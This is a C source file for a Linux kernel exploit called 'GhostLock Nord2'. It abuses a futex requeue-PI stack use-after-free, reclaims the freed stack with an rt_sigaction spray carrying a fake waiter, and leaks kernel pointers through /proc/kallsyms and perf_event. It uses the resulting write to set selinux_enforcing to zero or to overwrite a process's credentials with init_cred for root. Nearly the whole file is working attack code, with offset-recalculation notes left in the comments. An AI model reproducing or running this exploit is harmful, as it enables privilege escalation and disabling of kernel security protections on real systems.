/*
 * GhostLock Nord2 - rt_sigaction stack reclaim
 *
 * sys_rt_sigaction frame = 0x1f0
 * sigaction struct at SP+0x10, depth = 0x1e0
 * sa_mask at sigaction+0x18 = SP+0x28, depth = 0x1c8
 *
 * Freed waiter at absolute depth 0x1d8 from kernel entry.
 * sigaction starts at depth 0x1e0.
 *
 * Waiter field offsets in sigaction struct:
 *   waiter->prio  at sigaction[0x20] = sa_mask[8..11]
 *   waiter->task  at sigaction[0x58] = sa_mask[0x40..0x47]
 *   waiter->lock  at sigaction[0x60] = sa_mask[0x48..0x4f]
 *
 * With sigsetsize=0x50: sa_mask covers sa_mask[0..0x4f]
 * sigaction struct size = 0x18 + 0x50 = 0x68 bytes
 * rt_sigaction(sig, &sa, NULL, 0x50) copies 0x68 bytes to kernel stack
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <linux/futex.h>
#include <linux/perf_event.h>
#include <signal.h>
#include <time.h>
#include <errno.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_rt_sigaction
#define SYS_rt_sigaction 134
#endif
#ifndef SYS_perf_event_open
#define SYS_perf_event_open 241
#endif

/* Target struct offsets */
#define TASK_CRED_OFF        0x900
#define TASK_PI_TOP_TASK_OFF 0xa10
#define FAKE_WAITER_PRIO     140

/* Waiter struct offsets from waiter start */
#define W_TREE_PC   0x00
#define W_TREE_R    0x08
#define W_TREE_L    0x10
#define W_PRIO      0x18
#define W_DEADLINE  0x1c
#define W_PI_PC     0x28
#define W_PI_R      0x30
#define W_PI_L      0x38
#define W_PI_PRIO   0x40
#define W_PI_DEAD   0x44
#define W_TASK      0x50
#define W_LOCK      0x58
#define W_WAKE      0x60

/* sigaction layout (kernel):
 * +0x00: sa_handler (8)
 * +0x08: sa_flags (8)
 * +0x10: sa_restorer (8)
 * +0x18: sa_mask[0..sigsetsize-1]
 *
 * sigaction depth from entry = 0x1e0
 * Offsets into sigaction = 0x1e0 - (field_depth_from_entry)
 *
 * waiter->prio  depth=0x1c0 → sigaction[0x20] = sa_mask[0x08]
 * waiter->task  depth=0x188 → sigaction[0x58] = sa_mask[0x40]
 * waiter->lock  depth=0x180 → sigaction[0x60] = sa_mask[0x48]
 *
 * sa_mask offsets relative to sa_mask[0]:
 *   sa_mask[0x00] = sigaction[0x18] = waiter->tree_pc (rb_parent_color = target-8)
 *   sa_mask[0x08] = sigaction[0x20] = waiter->prio
 *   sa_mask[0x10] = sigaction[0x28] = waiter->tree_right ... no
 *
 * Wait - let me recalculate carefully:
 * Waiter is at depth 0x1d8 → waiter_start = S-0x1d8
 * waiter[+0x00] = waiter->tree_pc at depth 0x1d8+0 = 0x1d8 from entry
 *   → sigaction offset = 0x1e0-0x1d8 = 0x08 → sa_mask[0x08-0x18] NEGATIVE! Wrong.
 *
 * Wait, waiter is BELOW the sigaction start.
 * sigaction start at depth 0x1e0 = SP+0x10 (sigaction start)
 * waiter start at depth 0x1d8
 * 0x1d8 < 0x1e0 means waiter is SHALLOWER (lower stack address = closer to entry).
 * 
 * sigaction data goes from depth 0x1e0 DOWN TO 0x1e0-0x68=0x178.
 * waiter is at depth 0x1d8, which is between 0x1e0 and 0x178. ✓
 * 
 * Offset of waiter start in sigaction = 0x1e0 - 0x1d8 = 0x08.
 * So: sigaction[0x08] = waiter->tree_pc
 *     sigaction[0x08+W_TREE_PC] = sigaction[0x08] = waiter[0x00]
 *     sigaction[0x08+W_PRIO]    = sigaction[0x20] = waiter[0x18] = waiter->prio
 *     sigaction[0x08+W_TASK]    = sigaction[0x58] = waiter[0x50] = waiter->task
 *     sigaction[0x08+W_LOCK]    = sigaction[0x60] = waiter[0x58] = waiter->lock
 *     sigaction[0x08+0x68]      = sigaction[0x70] = waiter[0x68] = waiter->ww_ctx
 *
 * sigaction layout:
 *   +0x00 sa_handler
 *   +0x08 sa_flags  ← waiter->tree_pc = sa_flags (!)
 *   +0x10 sa_restorer ← waiter->tree_right (8 bytes)
 *   +0x18 sa_mask[0] ← waiter->tree_left (8 bytes)
 *   +0x20 sa_mask[8] ← waiter->prio (int32) + waiter->dl_prio (int32)
 *   +0x28 sa_mask[16] ← waiter->deadline (u64)
 *   +0x30 sa_mask[24] ← waiter->pi_tree.pc (8)
 *   +0x38 sa_mask[32] ← waiter->pi_tree.right (8)
 *   +0x40 sa_mask[40] ← waiter->pi_tree.left (8)
 *   +0x48 sa_mask[48] ← waiter->pi_prio + pi_dl_prio (4+4)
 *   +0x50 sa_mask[56] ← waiter->pi_deadline (8)
 *   +0x58 sa_mask[64] ← waiter->task (8)
 *   +0x60 sa_mask[72] ← waiter->lock (8)
 *   +0x68 sa_mask[80] ← waiter->wake_state (4) + padding
 *   +0x70 sa_mask[88] ← waiter->ww_ctx (8) (end)
 *
 * sa_flags (at +0x08) = waiter->tree_pc = rb_parent_color = target-8
 * sa_restorer (at +0x10) = waiter->tree_right = fake_right = init_cred
 * sa_mask bytes 0..7 = waiter->tree_left = 0 (NULL)
 * sa_mask bytes 8..11 = waiter->prio = FAKE_WAITER_PRIO
 * ...
 * sa_mask bytes 64..71 = waiter->task = init_task
 * sa_mask bytes 72..79 = waiter->lock = fake_lock (page_base+LOCK_OFF)
 *
 * sigsetsize = 90 (= 0x5a to cover wake_state)
 * Total sigaction struct = 0x18 + 0x5a = 0x72 bytes
 *
 * This approach uses sa_flags and sa_restorer for waiter rb_node fields!
 * That's fine - the kernel copies them to stack, we don't care about the signal.
 */

static inline void put32(uint8_t *p,size_t o,uint32_t v){memcpy(p+o,&v,4);}
static inline void put64(uint8_t *p,size_t o,uint64_t v){memcpy(p+o,&v,8);}

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_spray=0, g_spray_done=0;
static atomic_int g_stop_owner=0;

static uint64_t g_init_task=0, g_init_cred=0;
static uint64_t g_page_base=0;   /* from KernelSnitch */
static uint64_t g_child_task=0;  /* from perf_event */
static int      g_write_mode=0;  /* 1=test prio, 2=cred write */

static uint64_t read_sym(const char *nm){
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,nm)){fclose(f);return a;}
    fclose(f); return 0;
}
static int get_prio(pid_t tid){
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

/* Build fake waiter in sigaction buffer.
 * sigaction is 0x18 bytes of handler/flags/restorer,
 * then sa_mask which starts at offset 0x18.
 * 
 * Waiter overlaps sigaction at offset 0x08 (sa_flags position).
 * So:
 *   sigaction[0x08] = waiter[0x00] = tree_pc = target-8
 *   sigaction[0x10] = waiter[0x08] = tree_right = fake_right
 *   sigaction[0x18] = waiter[0x10] = tree_left = 0 (in sa_mask)
 *   ... (sa_mask continues)
 *   sigaction[0x58] = waiter[0x50] = task = init_task
 *   sigaction[0x60] = waiter[0x58] = lock = fake_lock
 */
static void build_sigaction(uint8_t *buf, size_t bufsz,
                              uint64_t target, uint64_t fake_right,
                              uint64_t fake_lock, uint64_t init_task) {
    memset(buf, 0, bufsz);
    
    /* Header: sa_handler at +0x00, sa_flags at +0x08, sa_restorer at +0x10 */
    put64(buf, 0x00, (uint64_t)SIG_DFL);  /* sa_handler = SIG_DFL */
    put64(buf, 0x08, target - 8);          /* sa_flags   = waiter->tree_pc */
    put64(buf, 0x10, fake_right);          /* sa_restorer= waiter->tree_right */
    
    /* sa_mask starts at +0x18 */
    /* sa_mask[0x00] = waiter->tree_left = 0 (NULL) */
    put64(buf, 0x18, 0);
    
    /* sa_mask[0x08] = waiter->prio (int32) + waiter->dl_prio/deadline[0..3] */
    put32(buf, 0x20, FAKE_WAITER_PRIO);  /* prio */
    put32(buf, 0x24, 0);                  /* dl_prio padding */
    
    /* sa_mask[0x10] = waiter->deadline */
    put64(buf, 0x28, 0);
    
    /* sa_mask[0x18] = waiter->pi_tree.pc = target-8 */
    put64(buf, 0x30, target - 8);
    
    /* sa_mask[0x20] = waiter->pi_tree.right = fake_right */
    put64(buf, 0x38, fake_right);
    
    /* sa_mask[0x28] = waiter->pi_tree.left = 0 */
    put64(buf, 0x40, 0);
    
    /* sa_mask[0x30] = waiter->pi_prio */
    put32(buf, 0x48, FAKE_WAITER_PRIO);
    put32(buf, 0x4c, 0);
    
    /* sa_mask[0x38] = waiter->pi_deadline */
    put64(buf, 0x50, 0);
    
    /* sa_mask[0x40] = waiter->task = init_task */
    put64(buf, 0x58, init_task);
    
    /* sa_mask[0x48] = waiter->lock = fake_lock */
    put64(buf, 0x60, fake_lock);
    
    /* sa_mask[0x50] = waiter->wake_state = 0 */
    put32(buf, 0x68, 0);
}

void *owner_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    while(!atomic_load(&g_stop_owner)){
        syscall(SYS_futex,&f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
        syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
        usleep(50);
    }
    return NULL;
}

void *waiter_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while(!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    /* UAF: stack frame freed after this returns */
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);

    /* Stack freed. Spray via rt_sigaction. */
    while(!atomic_load(&g_do_spray)) usleep(50);

    /* Build sigaction with fake waiter data */
    /* SKB payload: page_base + SKB_DATA_DELTA + LOCK_OFF */
    int64_t skb_d=-0xe80LL;
    uint64_t payload_base = g_page_base + (uint64_t)(int64_t)skb_d;
    uint64_t fake_lock  = payload_base + 0x0E80ULL; /* LOCK_OFF */

    uint64_t target, fake_right;
    if(g_write_mode == 1){
        /* Test: write to init_task->prio area (detectable, safe) */
        /* Actually write 0 to selinux_enforcing */
        uint64_t stext=read_sym("_stext");
        target    = stext + 0x2272fd8ULL; /* selinux_enforcing */
        fake_right= g_page_base + 0x100ULL; /* byte[0]=0 → enforcing=0 */
    } else {
        /* Write 2: child_task->cred = init_cred */
        target    = g_child_task + TASK_CRED_OFF;
        fake_right= g_init_cred;
    }

    /* sigaction buffer: 0x18 (header) + 0x5a (sa_mask) = 0x72 bytes */
    /* sigsetsize = 0x5a (bytes of sa_mask) */
    #define SA_BUF_SZ 0x72
    uint8_t sabuf[SA_BUF_SZ];
    build_sigaction(sabuf, SA_BUF_SZ, target, fake_right, fake_lock, g_init_task);

    /* Call rt_sigaction with our crafted sigaction.
     * Use SIGUSR1 - won't actually install (we pass old=NULL and the handler is SIG_DFL).
     * The kernel COPIES the sigaction from userspace onto ITS OWN STACK.
     * That copy goes to: SP+0x10 in sys_rt_sigaction's frame.
     * Which overlaps the freed waiter at the right depth.
     */
    for(int rep=0; rep<32; rep++){
        syscall(SYS_rt_sigaction, SIGUSR1,
                sabuf,      /* new sigaction (our fake waiter) */
                NULL,       /* old sigaction */
                (size_t)0x5a /* sigsetsize */);
    }

    atomic_store(&g_spray_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

/* Perf task leak */
static uint64_t perf_find_task(void){
    struct perf_event_attr pe={0};
    pe.type=PERF_TYPE_SOFTWARE; pe.size=sizeof(pe);
    pe.config=PERF_COUNT_SW_CPU_CLOCK; pe.sample_period=5000;
    pe.sample_type=PERF_SAMPLE_IP|PERF_SAMPLE_REGS_INTR;
    pe.sample_regs_intr=(1ULL<<32)-1; pe.disabled=1;
    pe.exclude_user=1; pe.exclude_hv=1; pe.exclude_idle=1;
    int fd=(int)syscall(SYS_perf_event_open,&pe,0,-1,-1,0);
    if(fd<0) return 0;
    size_t msz=4096*(1+32);
    void *buf=mmap(NULL,msz,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(buf==MAP_FAILED){close(fd);return 0;}
    ioctl(fd,PERF_EVENT_IOC_ENABLE,0);
    for(volatile int i=0;i<2000000;i++) syscall(SYS_gettid);
    ioctl(fd,PERF_EVENT_IOC_DISABLE,0);
    struct perf_event_mmap_page *hdr=buf;
    uint64_t head=hdr->data_head; __sync_synchronize();
    char *base=(char*)buf+4096; size_t dsz=4096*32;
    uint64_t cands[256]; int nc=0;
    uint64_t pos=hdr->data_tail;
    while(pos<head&&nc<256){
        struct perf_event_header *ev=(void*)(base+(pos%dsz));
        if(!ev->size) break;
        if(ev->type==PERF_RECORD_SAMPLE){
            char *p=(char*)ev+sizeof(*ev); p+=8;
            uint64_t abi=*(uint64_t*)p; p+=8;
            if(abi==1||abi==2){
                uint64_t *regs=(uint64_t*)p;
                for(int i=0;i<32&&nc<256;i++){
                    uint64_t v=regs[i];
                    if(v>0xffffff8000000000ULL&&v<0xfffffffe00000000ULL) cands[nc++]=v;
                }
            }
        }
        pos+=ev->size;
    }
    hdr->data_tail=head; munmap(buf,msz); close(fd);
    uint64_t best=0; int bc=0;
    for(int i=0;i<nc;i++){
        int c=0; for(int j=0;j<nc;j++) if(cands[j]==cands[i]) c++;
        if(c>bc){bc=c;best=cands[i];}
    }
    return best;
}

/* Note: the rt_sigaction spray is the KEY new idea.
 * However, we STILL need page_base from KernelSnitch for fake_lock.
 * Without a valid fake_lock (page_base+LOCK_OFF), the chain walk will
 * dereference waiter->lock and potentially crash.
 * 
 * For the INITIAL TEST (write_mode=1), use a BSS address as fake_lock
 * where lock->wait_lock=0 AND lock->owner=NULL → chain exits cleanly.
 * This won't do a write, but proves the spray works without crashing.
 */

int main(void){
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== GhostLock Nord2 - rt_sigaction Spray ===\n");

    uint64_t stext=read_sym("_stext");
    if(!stext){fprintf(stderr,"[!] kptr_restrict\n");return 1;}
    g_init_task=stext+0x1c6d300ULL;
    g_init_cred=stext+0x1c976a8ULL;
    fprintf(stderr,"[*] stext=%llx init_task=%llx init_cred=%llx\n",
            (unsigned long long)stext,(unsigned long long)g_init_task,
            (unsigned long long)g_init_cred);

    /* For SAFETY TEST: use page_base=0 and fake_lock = BSS (all zeros) */
    /* BSS zeros mean: wait_lock=0 (unlocked), owner=NULL → chain exits immediately */
    /* No write but also no crash → proves spray works */
    uint64_t bss_addr = stext + 0x22730d8ULL; /* BSS region (all zeros) */
    g_page_base = bss_addr - (uint64_t)(uint64_t)(-0xe80LL) - 0x0E80ULL;
    /* Actually compute fake_lock directly: */
    /* fake_lock = bss_addr (wait_lock=0, owner=NULL) → safe test */
    
    g_write_mode = 1; /* SELinux test */

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    int selinux_before=0;
    {FILE *f=fopen("/sys/fs/selinux/enforce","r");
     if(f){fscanf(f,"%d",&selinux_before);fclose(f);}}
    fprintf(stderr,"[*] SELinux before: %d\n",selinux_before);

    for(int att=0;att<20;att++){
        f_wait=0; f_pi_target=0; f_pi_chain=0;
        atomic_store(&g_tid,0); atomic_store(&g_ready,0);
        atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
        atomic_store(&g_owner_done,0);
        atomic_store(&g_do_spray,0); atomic_store(&g_spray_done,0);
        atomic_store(&g_stop_owner,0);

        pthread_t ot,wt;
        pthread_create(&ot,NULL,owner_fn,NULL);
        pthread_create(&wt,NULL,waiter_fn,NULL);
        while(!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
        usleep(5000);

        syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
        usleep(1000);
        atomic_store(&g_do_spray,1);
        while(!atomic_load(&g_spray_done)) usleep(500);
        usleep(50000);

        atomic_store(&g_stop_owner,1);
        pthread_detach(ot); pthread_detach(wt);

        int selinux_now=0;
        {FILE *f=fopen("/sys/fs/selinux/enforce","r");
         if(f){fscanf(f,"%d",&selinux_now);fclose(f);}}
        pid_t tid=(pid_t)atomic_load(&g_tid);
        int p=get_prio(tid);
        fprintf(stderr,"[att=%d] prio=%d selinux=%d\n",att,p,selinux_now);
        if(!selinux_now && selinux_before){
            fprintf(stderr,"\n[!!!] SELinux DISABLED - write succeeded!\n");
            break;
        }
        usleep(10000);
    }
    return 0;
}
__attribute__((constructor)) static void _init(void){main();}
